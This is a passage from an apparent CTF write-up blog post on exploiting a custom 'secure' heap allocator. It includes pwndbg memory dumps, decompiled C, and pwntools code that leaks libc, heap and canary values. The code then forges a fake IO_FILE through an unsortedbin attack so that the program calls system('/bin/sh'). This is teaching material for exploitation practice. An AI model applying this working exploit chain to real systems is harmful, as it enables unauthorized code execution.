non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>The look in memory:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((_IO_lock_t*)0x000055dc452ed0f0)                                                                                 [33/1706]</span><br><span class="line">$15 = &#123;</span><br><span class="line">  lock = 0, </span><br><span class="line">  cnt = 0, </span><br><span class="line">  owner = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *((struct _IO_wide_data*)0x55dc452ed100)</span><br><span class="line">$16 = &#123;</span><br><span class="line">  _IO_read_ptr = 0x0, </span><br><span class="line">  _IO_read_end = 0x0, </span><br><span class="line">  _IO_read_base = 0x0, </span><br><span class="line">  _IO_write_base = 0x0, </span><br><span class="line">  _IO_write_ptr = 0x0, </span><br><span class="line">  _IO_write_end = 0x0, </span><br><span class="line">  _IO_buf_base = 0x0, </span><br><span class="line">  _IO_buf_end = 0x0, </span><br><span class="line">  _IO_save_base = 0x0, </span><br><span class="line">  _IO_backup_base = 0x0, </span><br><span class="line">  _IO_save_end = 0x0, </span><br><span class="line">  _IO_state = &#123;</span><br><span class="line">    __count = 0, </span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0, </span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  _IO_last_state = &#123;</span><br><span class="line">    __count = 0, </span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0, </span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line"></span><br><span class="line">  _codecvt = &#123;                                                                                                                </span><br><span class="line">    __codecvt_destr = 0x0, </span><br><span class="line">    __codecvt_do_out = 0x0, </span><br><span class="line">    __codecvt_do_unshift = 0x0, </span><br><span class="line">    __codecvt_do_in = 0x0, </span><br><span class="line">    __codecvt_do_encoding = 0x0, </span><br><span class="line">    __codecvt_do_always_noconv = 0x0, </span><br><span class="line">    __codecvt_do_length = 0x0, </span><br><span class="line">    __codecvt_do_max_length = 0x0, </span><br><span class="line">    __cd_in = &#123;</span><br><span class="line">      __cd = &#123;</span><br><span class="line">        __nsteps = 0, </span><br><span class="line">        __steps = 0x0, </span><br><span class="line">        __data = 0x55dc452ed1b8</span><br><span class="line">      &#125;, </span><br><span class="line">      __combined = &#123;</span><br><span class="line">        __cd = &#123;</span><br><span class="line">          __nsteps = 0, </span><br><span class="line">          __steps = 0x0, </span><br><span class="line">          __data = 0x55dc452ed1b8</span><br><span class="line">        &#125;, </span><br><span class="line">        __data = &#123;</span><br><span class="line">          __outbuf = 0x0, </span><br><span class="line">          __outbufend = 0x0, </span><br><span class="line">          __flags = 0, </span><br><span class="line">          __invocation_counter = 0, </span><br><span class="line">          __internal_use = 0, </span><br><span class="line">          __statep = 0x0, </span><br><span class="line">          __state = &#123;</span><br><span class="line">            __count = 0, </span><br><span class="line">            __value = &#123;</span><br><span class="line">              __wch = 0, </span><br><span class="line">              __wchb = &quot;\000\000\000&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    __cd_out = &#123;</span><br><span class="line">      __cd = &#123;</span><br><span class="line">        __nsteps = 0, </span><br><span class="line">        __steps = 0x0, </span><br><span class="line">        __data = 0x55dc452ed1f8</span><br><span class="line">      &#125;, </span><br><span class="line">      __combined = &#123;</span><br><span class="line">        __cd = &#123;</span><br><span class="line">          __nsteps = 0, </span><br><span class="line">          __steps = 0x0, </span><br><span class="line">          __data = 0x55dc452ed1f8</span><br><span class="line">        &#125;, </span><br><span class="line">        __data = &#123;</span><br><span class="line">          __outbuf = 0x0, </span><br><span class="line">          __outbufend = 0x0, </span><br><span class="line">          __flags = 0, </span><br><span class="line">          __invocation_counter = 0, </span><br><span class="line">          __internal_use = 0, </span><br><span class="line">          __statep = 0x0, </span><br><span class="line">          __state = &#123;</span><br><span class="line">            __count = 0, </span><br><span class="line">            __value = &#123;</span><br><span class="line">              __wch = 0, </span><br><span class="line">              __wchb = &quot;\000\000\000&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  _shortbuf = L&quot;&quot;, </span><br><span class="line">  _wide_vtable = 0x7fb6d6371260 &lt;_IO_wfile_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The <strong>/dev/urandom</strong> data:<br><a data-fancybox="gallery" href="https://i.imgur.com/qMiuNZS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qMiuNZS.png" alt><br></a><br>This data is <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/iofopen.c#L79" target="_blank" rel="noopener">freed</a> but not cleared which means later we can leak this data by overlapping new chunks and use the <strong>print</strong> function to leak <strong>libc</strong>, <strong>heap</strong> and even the <strong>heap canary</strong> created by this library.  </p><p><strong>securealloc</strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/qMiuNZS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Vkfyzmz.png" alt><br></a></p><p><strong>securealloc</strong> adds 0x10 more bytes to the allocated space to store a canary at the end of the chunk and the size at the beginning:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__<span class="function">fastcall <span class="title">secure_malloc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size + <span class="number">0x10</span>); <span class="comment">// integer overflow here btw :)</span></span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    __abort((__int64)<span class="string">"Resource depletion (secure_malloc)"</span>);</span><br><span class="line">  *v2 = size;</span><br><span class="line">  v2[<span class="number">1</span>] = size + <span class="number">1</span>;</span><br><span class="line">  *(_QWORD *)((<span class="keyword">char</span> *)v2 + size + <span class="number">8</span>) = canary;</span><br><span class="line">  <span class="keyword">return</span> v2 + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is an integer overflow at <strong>malloc(size + 0x10)</strong> this could also be used to bypass the canary unfortunately the canary is going to be stored at a very <strong>high heap address</strong> which is unmapped we would have to expand the heap multiple times to get a mappable address, while this is feasible to do it locally it isn’t remotely because while there is a limit restriction of memory on the server we also would take 1 or 2 hours to do it (because we are communicating remotely).</p><p><strong>securefree</strong>  </p><p><a data-fancybox="gallery" href="https://i.imgur.com/NyeP7Hq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NyeP7Hq.png" alt><br></a></p><p>There is a double free verification and also wipes out the chunk data before freeing.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">secure_free</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = *(_DWORD *)(a1 - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 - <span class="number">4</span>) - v1 != <span class="number">1</span> )</span><br><span class="line">      __abort((__int64)<span class="string">"*** double free detected ***: &lt;unknown&gt; terminated"</span>);</span><br><span class="line">    __heap_chk_fail(a1);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)(a1 - <span class="number">8</span>), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 + <span class="number">16</span>));</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)(a1 - <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;.</span><br></pre></td></tr></table></figure></p><p><strong>_heap_chk_fail</strong></p><p>this the function that verifies if there is a heap overflow.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall _heap_chk_fail(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_DWORD *)(a1 - <span class="number">8</span>);</span><br><span class="line">    result = *(_DWORD *)(a1 - <span class="number">4</span>) - v2;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = canary;</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(v2 + a1) != canary )</span><br><span class="line">        __abort((__int64)<span class="string">"*** heap smashing detected ***: &lt;unknown&gt; terminated"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LEAK-heap-and-libc-address"><a href="#LEAK-heap-and-libc-address" class="headerlink" title="LEAK heap and libc address"></a>LEAK heap and libc address</h3><p>This the looks of the memory after <strong>secure_init</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/7CfvJBb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7CfvJBb.png" alt><br></a></p><p>To leak both we can first allocate a chunk of 0x60 and then 0x30 (this one leaks heap) and then 0x10 (this one will leak IO_JUMP libc address).</p><p><a data-fancybox="gallery" href="https://i.imgur.com/crnR1Uz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/crnR1Uz.png" alt><br></a></p><p>The python code to do this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>) <span class="comment"># this one is freed for a reason this will be explained later</span></span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">HEAPADDR = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">HEAP = HEAPADDR - <span class="number">0xf0</span></span><br><span class="line">log.info(<span class="string">"HEAPADDR 0x%x"</span> % HEAPADDR)</span><br><span class="line">log.info(<span class="string">"HEAP 0x%x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">IOFILEJUMPS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)) <span class="comment"># _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">LIBC = IOFILEJUMPS - libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">_IO_LIST_ALL = LIBC + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"IO_file_jumps 0x%x"</span> % IOFILEJUMPS)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br></pre></td></tr></table></figure><h3 id="Leak-canary"><a href="#Leak-canary" class="headerlink" title="Leak canary"></a>Leak canary</h3><p>The canary is located at <strong>/dev/urandom</strong> data:  </p><p><a data-fancybox="gallery" href="https://i.imgur.com/d7frMoF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/d7frMoF.png" alt><br></a></p><p>We do the same thing by allocating first a chunk of data <strong>0x140</strong> and then <strong>0x8</strong>:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap canary (/dev/urandom buffer)</span></span><br><span class="line">add(<span class="number">0x140</span>)</span><br><span class="line">add(<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">HEAPCANARY = u64(r.recvline().rstrip()[<span class="number">-7</span>::].rjust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"HEAPCANARY 0x%x"</span> % HEAPCANARY)</span><br></pre></td></tr></table></figure><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><p>This isn’t exactly <strong>house of orange</strong>, house of orange usually is used when there isn’t a possibility of using a free by forcing the heap to expand by triggering <strong>sysmalloc</strong> when the <strong>top_chunk</strong> has no more space to allocate freeing the topchunk… </p><p>In our case we just want to convert the <strong>freed</strong> <strong>0x60</strong> sized chunk we freed previously into a <strong>smallbin</strong>. </p><p>When there is a large request(largebin size is enough) of malloc, a consolidation happens in order to prevent fragmentation. Every fastbin is moved to the <strong>unsortedbin</strong>, <strong>consolidates</strong> if possible, and finally goes to <strong>smallbin</strong>.  </p><p>Later we use an <strong>unsortedbin attack</strong> with <strong>File Stream Oriented Programming</strong> to get a system(‘/bin/sh’) shell.</p><p>So this is the moment right before we allocate a chunk of <strong>0x3e0</strong> (0x3e0+0x10 &gt; 1000 in decimal):<br><a data-fancybox="gallery" href="https://i.imgur.com/s4LphAD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/s4LphAD.png" alt><br></a><br>Now after executing malloc this fastbin chunk will be transformed into a <strong>smallbin</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/wmDqbx0.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/wmDqbx0.png" alt><br></a></p><h3 id="File-Stream-Oriented-Programming"><a href="#File-Stream-Oriented-Programming" class="headerlink" title="File Stream Oriented Programming"></a>File Stream Oriented Programming</h3><p>We know that <strong>ROP</strong> can be used to hijack the control flow of the program, this can also be achieved by using <strong>file stream oriented programming</strong> but this one is achieved through an attack at <strong>File Stream</strong>.</p><p>We need to first understand <strong>malloc</strong> error message, which <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3384" target="_blank" rel="noopener">malloc_printerr</a> is the function used to print the error:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">    errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>the function is calls <strong>__libc_message</strong> after the abort function is called. The structure inside is used here, and the method of calling the virtual table is triggered.</p><p><strong>abort</strong> -&gt; <strong>_IO_flush_all_lockp</strong> -&gt; <strong>_IO_list_all</strong></p><p>We can use the heap overflow to change the smallbin bk and implement the unsortbin attack, bk address should point to _IO_list_all -0x10 so we can corrupt <strong>_IO_list_all</strong>.</p><p>In the end the unsortedbin attack will change the pointer of <strong>_IO_list_all</strong> into a location in <strong>main_arena</strong>, which will make <strong>_chain</strong> pointer of <strong>_IO_list_all</strong> to a fake <strong>IO_FILE</strong> (This fake IO_FILE will be located in heap).</p><p>Here is how <strong>_IO_list_all</strong> looks in memory:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)0x7f742fb8db78)</span><br><span class="line">$13 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xf12befc0, </span><br><span class="line">    _IO_read_ptr = 0x559af129d4f0 &quot;&quot;, </span><br><span class="line">    _IO_read_end = 0x559af129d4f0 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7f742fb8e510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, </span><br><span class="line">    _IO_write_end = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, </span><br><span class="line">    _IO_save_base = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, </span><br><span class="line">    _IO_backup_base = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, </span><br><span class="line">    _IO_save_end = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, </span><br><span class="line">    _markers = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, </span><br><span class="line">    _chain = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, </span><br><span class="line">    _fileno = 0x2fb8dbd8, </span><br><span class="line">    _flags2 = 0x7f74, </span><br><span class="line">    _old_offset = 0x7f742fb8dbd8, </span><br><span class="line">    _cur_column = 0xdbe8, </span><br><span class="line">    _vtable_offset = 0xb8, </span><br><span class="line">    _shortbuf = &quot;/&quot;, </span><br><span class="line">    _lock = 0x7f742fb8dbe8 &lt;main_arena+200&gt;, </span><br><span class="line">    _offset = 0x7f742fb8dbf8, </span><br><span class="line">    _codecvt = 0x7f742fb8dbf8 &lt;main_arena+216&gt;, </span><br><span class="line">    _wide_data = 0x7f742fb8dc08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_list = 0x7f742fb8dc08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_buf = 0x7f742fb8dc18 &lt;main_arena+248&gt;, </span><br><span class="line">    __pad5 = 0x7f742fb8dc18, </span><br><span class="line">    _mode = 0x2fb8dc28, </span><br><span class="line">    _unused2 = &quot;t\177\000\000(?/t\177\000\000\070?/t&quot;...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f742fb8dc38 &lt;main_arena+280&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We need to forge an IO file that meets some <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/genops.c#L701" target="_blank" rel="noopener">specifications</a>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">   &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">    ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>Also need to change <strong>vtable</strong> address to a place we can control in this case I used a place on the heap.</p><p>We need then the <strong>_IO_OVERFLOW</strong> pointer to be setted to system, the fp header is set to <strong>/bin/sh</strong>.</p><p>we first allocate a chunk of size <strong>0x0</strong> but with the summation of <strong>securealloc</strong> the size will be <strong>0x0+0x10 =0x10</strong>, this will create a small chunk and it’s going to be allocated in the space of the first chunk we freed taking up 0x10 of it’s space, and create a new unsortedbin as we can see below:<br><a data-fancybox="gallery" href="https://i.imgur.com/0li57Hx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0li57Hx.png" alt><br></a><br>This is the payload we want to use:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(HEAPCANARY) <span class="comment"># rewrite canary to avoid security trigger</span></span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span> <span class="comment"># fp header is set to **/bin/sh**</span></span><br><span class="line">payload += p64(<span class="number">0x61</span>) <span class="comment"># chunk size</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># FD flags field</span></span><br><span class="line">payload += p64(_IO_LIST_ALL<span class="number">-0x10</span>) <span class="comment"># BK point where we want to write</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">18</span> <span class="comment"># from _IO_read_ptr to __pad5</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># fp-&gt;_mode &lt;= 0</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># unused</span></span><br><span class="line">payload += p64(HEAP+<span class="number">0x100</span>) <span class="comment"># VTABLE ADDRESS</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment">#OUR VTABLE starts here which is located at HEAPBASE+0x100</span></span><br><span class="line">payload += p64(SYSTEM) <span class="comment"># _IO_OVERFLOW overwritten with system</span></span><br></pre></td></tr></table></figure><p>Creating the chunks:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x0</span>) <span class="comment"># create 0x21 chunk</span></span><br><span class="line">edit(payload) <span class="comment"># overflow 0x21 chunk</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># trigger _IO_OVERFLOW aka system('/bin/sh')</span></span><br></pre></td></tr></table></figure><p>The data after the overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/MrGMNXd.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/MrGMNXd.png" alt><br></a><br>The exploit is not very reliable and sometimes fails so I putted it in an infinite loop to avoid rerunning the script at failurers:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 